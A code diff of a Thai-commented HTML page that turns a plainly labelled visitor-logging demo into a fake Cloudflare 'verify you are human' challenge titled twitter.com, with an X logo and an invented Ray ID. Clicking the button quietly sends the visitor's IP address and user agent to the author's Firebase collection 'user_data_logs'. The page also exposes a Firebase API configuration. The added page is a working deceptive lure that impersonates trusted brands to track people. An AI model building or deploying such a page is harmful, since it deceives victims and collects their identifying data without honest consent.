@@ -3,115 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>บันทึกข้อมูลผู้ใช้ด้วย Firebase บน GitHub Pages</title>
+    <title>twitter.com</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; }
-        button { padding: 10px 20px; margin: 5px 0; font-size: 16px; cursor: pointer; background-color: #4CAF50; color: white; border: none; border-radius: 5px; }
-        button:hover { background-color: #45a049; }
-        #status { color: green; font-weight: bold; margin-top: 15px; }
-        .data-box { margin-top: 20px; padding: 15px; background-color: #f4f4f9; border-left: 4px solid #2196F3; display: none; }
+        /* ตั้งค่าพื้นฐานและการจัดวางให้อยู่กึ่งกลางหน้าจอ */
+        body {
+            background-color: #222222;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        /* ส่วนหัวโลโก้ X และข้อความ twitter.com */
+        .header-logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 22px;
+            font-weight: bold;
+        }
+        /* ข้อความอธิบายด้านบน */
+        .instruction {
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+        /* กล่องตรวจสอบ (ที่ใส่ปุ่มและโลโก้ Cloudflare) */
+        .challenge-box {
+            border: 1px solid #444444;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            background-color: #2a2a2a;
+            border-radius: 4px;
+        }
+        /* รูปแบบปุ่ม */
+        #trackBtn {
+            padding: 12px 16px;
+            background-color: #ffffff;
+            color: #000000;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 15px;
+            transition: background-color 0.2s;
+        }
+        #trackBtn:hover {
+            background-color: #e0e0e0;
+        }
+        /* ส่วนโลโก้ Cloudflare และข้อความด้านขวา */
+        .cloudflare-logo {
+            text-align: right;
+            font-size: 10px;
+            color: #aaaaaa;
+        }
+        .cloudflare-logo img {
+            width: 90px;
+            margin-bottom: 5px;
+            filter: brightness(0) invert(1); /* ทำให้โลโก้เป็นสีขาว */
+        }
+        .cloudflare-logo a {
+            color: #aaaaaa;
+            text-decoration: none;
+        }
+        .cloudflare-logo a:hover {
+            text-decoration: underline;
+        }
+        /* ข้อความด้านล่างกล่อง */
+        .footer-text {
+            font-size: 15px;
+            color: #bbbbbb;
+            line-height: 1.5;
+        }
+        /* ส่วนท้าย (Ray ID) */
+        .bottom-info {
+            text-align: center;
+            font-size: 12px;
+            color: #777777;
+            margin-top: 60px;
+            border-top: 1px solid #444444;
+            padding-top: 20px;
+            line-height: 1.6;
+        }
+        /* ส่วนแสดงผลลัพธ์ของ Firebase */
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        #resultBox {
+            margin-top: 15px;
+            padding: 15px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 4px;
+            display: none;
+            font-size: 14px;
+            word-wrap: break-word;
+            line-height: 1.5;
+        }
     </style>
 </head>
 <body>
-    <h2>ระบบตรวจสอบและบันทึกข้อมูลผู้ใช้</h2>
-    <p>กดปุ่มด้านล่างเพื่อตรวจสอบข้อมูลเครื่องของคุณและบันทึกลงฐานข้อมูล</p>
-    <button id="trackBtn">ดึงข้อมูลและบันทึก</button>
-    <p id="status"></p>
-    <!-- กล่องสำหรับแสดงข้อมูลที่ดึงมาได้ -->
-    <div id="resultBox" class="data-box"></div>
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";
-        // Firebase Config ของคุณ
-        const firebaseConfig = {
-            apiKey: "AIzaSyAv7q5JRh_VnsKNqEDBl-60KruafC7fGfw",
-            authDomain: "app-ip-line.firebaseapp.com",
-            projectId: "app-ip-line",
-            storageBucket: "app-ip-line.firebasestorage.app",
-            messagingSenderId: "697728554662",
-            appId: "1:697728554662:web:73b67252752e97051c4667",
-            measurementId: "G-9YQ4CMNEW1"
-        };
-        // เริ่มต้นเชื่อมต่อแอปพลิเคชัน
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        // ฟังก์ชันดึงค่า IP Address จาก API ภายนอก
-        async function fetchIPAddress() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error("ดึง IP ไม่สำเร็จ: ", error);
-                return "ไม่สามารถตรวจสอบ IP ได้";
-            }
-        }
-        // เมื่อกดปุ่ม ให้เริ่มทำงาน
-        document.getElementById("trackBtn").addEventListener("click", async () => {
-            const statusText = document.getElementById("status");
-            const resultBox = document.getElementById("resultBox");
-            statusText.style.color = "blue";
-            statusText.innerText = "กำลังดึงข้อมูลและบันทึกลง Firestore...";
-            resultBox.style.display = "none";
-            try {
-                // 1. ตรวจสอบ IP Address
-                const ipAddress = await fetchIPAddress();
-                // 2. ตรวจสอบ ระบบปฏิบัติการ Version ข้อมูลสถานะเครื่อง ยี่ห้อรุ่น
-                // navigator.userAgent จะให้ข้อมูลสตริงที่บอกถึง OS, Browser และอุปกรณ์เบื้องต้น
-                const deviceInfo = navigator.userAgent;
-                // รวบรวมข้อมูลทั้งหมดเป็น Object เพื่อเตรียมบันทึก
-                const userTrackingData = {
-                    ip_address: ipAddress,
-                    device_info: deviceInfo,
-                    timestamp: new Date()
-                };
-                // คำสั่งบันทึกข้อมูลลง Firestore ในคอลเล็กชันชื่อ "user_data_logs"
-                const docRef = await addDoc(collection(db, "user_data_logs"), userTrackingData);
-                // แจ้งเตือนเมื่อสำเร็จและแสดงข้อมูลบนหน้าเว็บ
-                statusText.style.color = "green";
-                statusText.innerText = `บันทึกสำเร็จ! (Document ID: ${docRef.id})`;
-                resultBox.style.display = "block";
-                resultBox.innerHTML = `
-                    <strong>ข้อมูลที่ถูกบันทึก:</strong><br><br>
-                    <b>IP Address:</b> ${userTrackingData.ip_address}<br>
-                    <b>Device Info:</b> ${userTrackingData.device_info}
-                `;
-            } catch (error) {
-                console.error("เกิดข้อผิดพลาด: ", error);
-                statusText.style.color = "red";
-                statusText.innerText = "เกิดข้อผิดพลาดในการบันทึก กรุณาเปิด Console เพื่อดูรายละเอียดเพิ่มเติม";
-            }
-        });
-    </script>
-</body>
-</html>
- 
-///////backup ล่าสุด 25691013/////////////
+    <div class="container">
+        <!-- โลโก้ Header -->
+        <div class="header-logo">
+            <svg viewBox="0 0 24 24" aria-hidden="true" style="width: 28px; fill: white; margin-right: 12px;"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 22.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
+            twitter.com
+        </div>
+        
+        <div class="instruction">
+            ตรวจสอบว่าคุณเป็นมนุษย์ด้วยการทำด้านล่างนี้ให้เสร็จสิ้น
+        </div>
 
-<!DOCTYPE html>
-<html lang="th">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>บันทึกข้อมูลผู้ใช้ด้วย Firebase บน GitHub Pages</title>
-    <style>
-        body { font-family: sans-serif; padding: 20px; }
-        button { padding: 10px 20px; margin: 5px 0; font-size: 16px; cursor: pointer; background-color: #4CAF50; color: white; border: none; border-radius: 5px; }
-        button:hover { background-color: #45a049; }
-        #status { color: green; font-weight: bold; margin-top: 15px; }
-        .data-box { margin-top: 20px; padding: 15px; background-color: #f4f4f9; border-left: 4px solid #2196F3; display: none; }
-    </style>
-</head>
-<body>
-    <h2>ระบบตรวจสอบและบันทึกข้อมูลผู้ใช้</h2>
-    <p>กดปุ่มด้านล่างเพื่อตรวจสอบข้อมูลเครื่องของคุณและบันทึกลงฐานข้อมูล</p>
-    <button id="trackBtn">ดึงข้อมูลและบันทึก</button>
-    <p id="status"></p>
-    <!-- กล่องสำหรับแสดงข้อมูลที่ดึงมาได้ -->
-    <div id="resultBox" class="data-box"></div>
+        <!-- กล่อง Cloudflare ที่แก้ไขช่องติ๊กเป็นปุ่ม -->
+        <div class="challenge-box">
+            <div class="button-container">
+                <button id="trackBtn">กดยืนยันว่าคุณคือมนุษย์</button>
+            </div>
+            <div class="cloudflare-logo">
+                <img src="https://github.com/Thanapollekk/Tcsd_ip/blob/main/logocf.png" alt="Cloudflare">
+                <br>
+                <a href="#">ความเป็นส่วนตัว</a> • <a href="#">ข้อกำหนด</a>
+            </div>
+        </div>
+
+        <div class="footer-text">
+            twitter.com ต้องตรวจสอบความปลอดภัยการเชื่อมต่อของคุณก่อนดำเนินการต่อ
+        </div>
+
+        <!-- กล่องแสดงสถานะการดึงข้อมูล (ซ่อนไว้ก่อนจนกว่าจะกดปุ่ม) -->
+        <div id="status"></div>
+        <div id="resultBox"></div>
+
+        <!-- ส่วนท้ายสุดของจอ -->
+        <div class="bottom-info">
+            Ray ID: 969cc5ddfe53d32c<br>
+            ประสิทธิภาพและการรักษาความปลอดภัยโดย Cloudflare
+        </div>
+    </div>
+
+    <!-- โค้ด JavaScript ของคุณ -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";
+        
         // Firebase Config ของคุณ
         const firebaseConfig = {
             apiKey: "AIzaSyAv7q5JRh_VnsKNqEDBl-60KruafC7fGfw",
@@ -122,9 +168,11 @@
             appId: "1:697728554662:web:73b67252752e97051c4667",
             measurementId: "G-9YQ4CMNEW1"
         };
+        
         // เริ่มต้นเชื่อมต่อแอปพลิเคชัน
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
+        
         // ฟังก์ชันดึงค่า IP Address จาก API ภายนอก
         async function fetchIPAddress() {
             try {
@@ -136,29 +184,35 @@
                 return "ไม่สามารถตรวจสอบ IP ได้";
             }
         }
+        
         // เมื่อกดปุ่ม ให้เริ่มทำงาน
         document.getElementById("trackBtn").addEventListener("click", async () => {
             const statusText = document.getElementById("status");
             const resultBox = document.getElementById("resultBox");
-            statusText.style.color = "blue";
+            
+            // ปรับสีฟ้าให้สว่างขึ้นเพื่อให้เห็นชัดบนพื้นหลังสีดำ
+            statusText.style.color = "#4dabf7"; 
             statusText.innerText = "กำลังดึงข้อมูลและบันทึกลง Firestore...";
             resultBox.style.display = "none";
+            
             try {
                 // 1. ตรวจสอบ IP Address
                 const ipAddress = await fetchIPAddress();
                 // 2. ตรวจสอบ ระบบปฏิบัติการ Version ข้อมูลสถานะเครื่อง ยี่ห้อรุ่น
-                // navigator.userAgent จะให้ข้อมูลสตริงที่บอกถึง OS, Browser และอุปกรณ์เบื้องต้น
                 const deviceInfo = navigator.userAgent;
+                
                 // รวบรวมข้อมูลทั้งหมดเป็น Object เพื่อเตรียมบันทึก
                 const userTrackingData = {
                     ip_address: ipAddress,
                     device_info: deviceInfo,
                     timestamp: new Date()
                 };
+                
                 // คำสั่งบันทึกข้อมูลลง Firestore ในคอลเล็กชันชื่อ "user_data_logs"
                 const docRef = await addDoc(collection(db, "user_data_logs"), userTrackingData);
-                // แจ้งเตือนเมื่อสำเร็จและแสดงข้อมูลบนหน้าเว็บ
-                statusText.style.color = "green";
+                
+                // แจ้งเตือนเมื่อสำเร็จและแสดงข้อมูลบนหน้าเว็บ (ปรับสีเขียวให้สว่างขึ้น)
+                statusText.style.color = "#51cf66"; 
                 statusText.innerText = `บันทึกสำเร็จ! (Document ID: ${docRef.id})`;
                 resultBox.style.display = "block";
                 resultBox.innerHTML = `
@@ -168,11 +222,11 @@
                 `;
             } catch (error) {
                 console.error("เกิดข้อผิดพลาด: ", error);
-                statusText.style.color = "red";
+                // ปรับสีแดงให้สว่างขึ้น
+                statusText.style.color = "#ff6b6b"; 
                 statusText.innerText = "เกิดข้อผิดพลาดในการบันทึก กรุณาเปิด Console เพื่อดูรายละเอียดเพิ่มเติม";
             }
         });
     </script>
 </body>
 </html>
- 
